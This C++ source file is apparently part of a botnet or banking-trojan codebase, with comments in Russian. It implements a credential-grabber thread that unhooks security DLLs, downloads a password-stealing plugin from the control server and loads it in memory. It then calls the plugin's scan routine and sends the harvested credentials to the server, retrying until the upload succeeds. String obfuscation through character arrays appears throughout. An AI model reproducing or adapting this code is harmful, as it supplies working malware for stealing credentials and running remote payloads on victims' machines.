#include <windows.h>

#include "BotCore.h"
#include "Grabber.h"
#include "Loader.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Config.h"
#include "Crypt.h"
#include "Utils.h"
#include "Unhook.h"
#include "Task.h"
#include "Inject.h"
#include "Plugins.h"

//#include "BotDebug.h"


namespace Grabber
{
    #include "DbgTemplates.h"
}
#define GrabMessage  Grabber::DBGOutMessage<>

 
bool ExecuteGrabber(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Запустить поток грабера. Доступна только при включенном модуле грабера
	return TwiceJumpSelf(GrabberThread);
}


//#include "Temp\spambot.h"
DWORD WINAPI GrabberThread( LPVOID lpData )
	
{
	BOT::Initialize(ProcessUnknown);
	
	/*
	
	SpamBootRun(NULL);
	return 0;*/
	UnhookDlls();

	// Загружаем плагин
   //	const static char GrabberFile[] = {'/','c','f','g','/','p','a','s','s','w','.','p','l','u','g',0};

   const static char GrabberPlugin[] = {'p','a','s','s','w','.','p','l','u','g',0};

	LPVOID Module = Plugin::Download((PCHAR)GrabberPlugin, NULL, NULL);
	if (Module == NULL  )  return 0;

	//bool bKnock = false;

    // Выполняем плагин
	HMEMORYMODULE Lib = MemoryLoadLibrary(Module);

	if (Lib == NULL) return 0;

	typedef PCHAR (WINAPI *PFTPGRAB)();

	char GrabFTP[] = {'S','c','a','n','1', 0 };
		
	pCoUninitialize();
	pCoInitialize( NULL );
		
	PFTPGRAB FtpGrabber	 = (PFTPGRAB)MemoryGetProcAddress(Lib, GrabFTP);

	PCHAR Buffer = FtpGrabber();

    // Отправляем данные
	DWORD Size = StrCalcLength(Buffer);

	if (Size != 0)
	{
		Buffer[Size] = '\0';

		bool Sended = false;
		do
		{
			// Отправляем данные на сервер
			PCHAR ReportURL = GetBotScriptURL(SCRIPT_GRABBER);
			Sended = SendGrabberReport(ReportURL, Buffer, Size);
			if (!Sended) pSleep(60000);
			STR::Free(ReportURL);
		}
		while (!Sended);
	}

	MemoryFreeLibrary(Lib);

	MemFree(Buffer);
	MemFree(Module);

	pCoUninitialize();

	pExitProcess(0);

	return 0;
}

